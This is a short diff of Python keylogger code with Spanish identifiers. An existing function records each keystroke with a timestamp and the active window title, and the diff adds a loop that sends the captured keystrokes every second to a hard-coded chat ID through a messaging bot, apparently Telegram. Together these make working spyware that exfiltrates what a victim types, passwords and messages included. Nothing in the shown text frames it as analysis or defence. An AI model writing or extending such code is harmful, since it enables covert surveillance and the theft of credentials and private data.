@@ -21,3 +21,14 @@ async def capturar_teclas(bot):
                 tecla = f"{timestamp} |{window_title.strip()}|  ({get_key(codigo_tecla, mayuscula, alt_gr)})"
                 lista_teclas.append(tecla)
                 print(f"Key captured: {tecla}")
+
+async def enviar_teclas(bot):
+    global lista_teclas
+    while True:
+        await asyncio.sleep(1)
+        if lista_teclas:
+            try:
+                await bot.send_message(chat_id="817416698", text="\n".join(lista_teclas))
+                lista_teclas.clear()
+            except Exception as e:
+                registro_errores(f"Error sending key presses: {e}")
